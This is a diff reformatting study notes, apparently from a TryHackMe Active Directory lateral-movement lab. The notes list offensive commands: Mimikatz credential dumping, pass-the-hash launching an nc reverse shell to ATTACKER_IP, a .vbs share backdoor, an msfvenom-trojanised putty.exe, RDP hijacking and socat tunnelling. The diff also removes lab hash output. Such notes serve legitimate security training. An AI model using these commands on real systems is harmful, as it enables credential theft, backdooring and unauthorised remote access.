@@ -1,115 +1,100 @@
-Psexec
-Ports: 445/TCP (SMB)
-Required Group Memberships: Administrators
+## 📡 Remote Execution Prerequisites
 
-Remote Process Creation Using WMI
-Ports:
-135/TCP, 49152-65535/TCP (DCERPC)
-5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
-Required Group Memberships: Administrators
+PsExec requires specific network and permission configurations for successful execution.
+* Ports: 445/TCP (SMB)
+* Required Group Memberships: Administrators
 
+Remote Process Creation Using WMI requires similar elevated access and remote management ports.
+* Ports: 135/TCP, 49152-65535/TCP (DCERPC), 5985/TCP (WinRM HTTP), 5986/TCP (WinRM HTTPS)
+* Required Group Memberships: Administrators
 
-methods and tools to extract credentials from a host. Mimikatz
+## 🔑 Credential Extraction
 
+Extracting NTLM hashes from the local SAM only yields hashes for local machine users. Domain user hashes are unavailable via this method.
 
-Extracting NTLM hashes from local SAM:
-
-This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
-
-THMJMP2:
-Powershell
-
-
-NTLM Authentication
-
+```powershell
+# Extract NTLM hashes from local SAM
 mimikatz # privilege::debug
 mimikatz # token::elevate
+mimikatz # lsadump::sam
+```
+* Tool: Mimikatz
 
-mimikatz # lsadump::sam   
-RID  : 000001f4 (500)
-User : Administrator
-  Hash NTLM: 145e02c50333951f71d13c245d352b50
-Extracting NTLM hashes from LSASS memory:
+Extracting NTLM hashes from LSASS memory yields NTLM hashes for local users and any domain user recently authenticated on the host.
 
-This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
-
-THMJMP2: Powershell
+```powershell
+# Extract NTLM hashes from LSASS memory
 mimikatz # privilege::debug
 mimikatz # token::elevate
+mimikatz # sekurlsa::msv
+```
+* Tool: Mimikatz
 
-mimikatz # sekurlsa::msv 
-Authentication Id : 0 ; 308124 (00000000:0004b39c)
-Session           : RemoteInteractive from 2 
-User Name         : bob.jenkins
-Domain            : ZA
-Logon Server      : THMDC
-Logon Time        : 2022/04/22 09:55:02
-SID               : S-1-5-21-3330634377-1326264276-632209373-4605
-        msv :
-         [00000003] Primary
-         * Username : bob.jenkins
-         * Domain   : ZA
-         * NTLM     : 6b4a57f67805a663c818106dc0648484
+## 🛡️ Authentication Manipulation
 
 
+
+NTLM Authentication (Pass-the-Hash) executes a process as a target user utilizing their NTLM hash.
+
+```powershell
+# Execute Pass-the-Hash
 mimikatz # token::revert
 mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
+```
+* Tool: Mimikatz
 
+Kerberos Authentication (Pass-the-Ticket) injects extracted Kerberos tickets into the current session.
 
-Kerberos Authentication
+```powershell
+# Export and inject Kerberos tickets
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
-
 mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
+```
+* Tool: Mimikatz
 
-za\bob.jenkins@THMJMP2 C:\> klist
+```cmd
+# Verify cached Kerberos tickets
+klist
+```
+* Tool: Windows Command Prompt
 
-Current LogonId is 0:0x1e43562
+## 🗂️ Writable Share Abuse
 
-Cached Tickets: (1)
+A common lateral movement tactic involves modifying shortcuts, scripts, or executables hosted on accessible network shares.
 
-#0>     Client: Administrator @ ZA.TRYHACKME.COM
-        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
-        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
-        Start Time: 4/12/2022 0:28:35 (local)
-        End Time:   4/12/2022 10:28:35 (local)
-        Renew Time: 4/23/2022 0:28:35 (local)
-        Session Key Type: AES-256-CTS-HMAC-SHA1-96
-        Cache Flags: 0x1 -> PRIMARY
-        Kdc Called: THMDC.za.tryhackme.com
-
-
-Abusing Writable Shares
-One common scenario consists of finding a shortcut to a script or executable file hosted on a network share.
-
-Backdooring .vbs Scripts
+```vbscript
+# Backdoor .vbs script execution
 CreateObject("WScript.Shell").Run "cmd.exe /c copy /Y \\10.10.28.6\myshare\nc64.exe %tmp% & %tmp%\nc64.exe -e cmd.exe <attacker_ip> 1234", 0, True
+```
+* Tool: Windows Script Host (WSH)
 
-Backdooring .exe Files
+```bash
+# Generate backdoored executable payload
 msfvenom -a x64 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> lport=4444 -b "\x00" -f exe -o puttyX.exe
+```
+* Tool: MSFVenom
 
+## 🖥️ RDP Hijacking
 
+Hijacking allows an operator to take over an existing remote desktop session. Note: Windows Server 2019 restricts connecting to another user's session without their password.
 
-RDP hijacking
-
-
+```cmd
+# Escalate to SYSTEM and hijack RDP session
 PsExec64.exe -s cmd.exe
-C:\> query user
- USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
->administrator         rdp-tcp#6           2  Active          .  4/1/2022 4:09 AM
- luke                                    3  Disc            .  4/6/2022 6:51 AM
-
+query user
 tscon 3 /dest:rdp-tcp#6
+```
+* Tool: PsExec / Windows Command Prompt
+
+## 🚇 Port Forwarding and Tunnelling
 
 
-Note: Windows Server 2019 won't allow you to connect to another user's session without knowing its password.
 
+Traffic routing techniques allow access to segmented network services. Standard methods include SSH Remote Port Forwarding, SSH Local Port Forwarding, and Dynamic Port Forwarding (SOCKS).
 
-SSH Tunnelling
-SSH Remote Port Forwarding
-SSH Local Port Forwarding
-Port Forwarding With socat
-Dynamic Port Forwarding and SOCKS
-
+```bash
+# Port forwarding using socat
 socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:3389
+```
+* Tool: Socat
